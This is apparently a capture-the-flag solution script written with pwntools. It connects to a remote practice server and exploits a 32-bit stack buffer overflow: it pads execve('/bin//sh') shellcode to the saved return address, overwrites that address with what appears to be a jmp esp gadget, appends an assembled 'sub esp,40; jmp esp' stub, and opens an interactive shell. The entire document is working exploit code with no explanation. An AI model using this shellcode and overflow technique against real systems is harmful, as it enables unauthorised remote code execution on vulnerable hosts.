from pwn import *

sh=remote("node5.buuoj.cn",28908)

shellcode=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80"
payload=shellcode.ljust(0x24,b'a')+p32(0x08048554)+asm("sub esp,40;jmp esp")
sh.sendline(payload)
sh.interactive()
